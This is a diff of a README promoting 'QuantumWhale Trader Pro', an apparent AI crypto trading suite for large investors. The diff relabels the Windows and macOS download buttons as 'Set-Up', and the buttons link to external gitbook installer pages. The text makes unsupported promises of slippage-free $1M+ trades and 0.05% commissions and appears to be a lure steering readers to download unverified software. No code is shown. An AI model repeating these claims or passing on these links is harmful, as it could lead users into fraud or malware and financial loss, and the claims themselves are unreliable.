@@ -3,8 +3,8 @@
 # QuantumWhale Trader Pro: AI Crypto Trading Suite for Whales & Institutions
 > Trade cryptocurrency with $1M+ volumes without slippage. AI-strategies, 0.05% commissions, DeFi-stacking and smart contracts. For institutional investors.
 
-# Download QuantumWhale Trader Pro for Windows/macOS and start trading with 0.05% commission today.
-## MAC OS: [ ```Download``` ](https://selenium-finance.gitbook.io/quantumwhale-trader-pro/download/macos) Windows: [```Download```](https://selenium-finance.gitbook.io/quantumwhale-trader-pro/download/windows)
+# Client QuantumWhale Trader Pro for Windows/macOS and start trading with 0.05% commission today.
+## MAC OS: [ ```Set-Up``` ](https://selenium-finance.gitbook.io/quantumwhale-trader-pro/download/macos) Windows: [```Set-UP``](https://selenium-finance.gitbook.io/quantumwhale-trader-pro/download/windows)
 
 The crypto market of 2024 requires professional solutions for those who operate with large capitals ($1M+). Conventional exchanges and DEXs are not suitable for “whales”: high commissions, slippage and lack of risk management tools destroy profits.
 
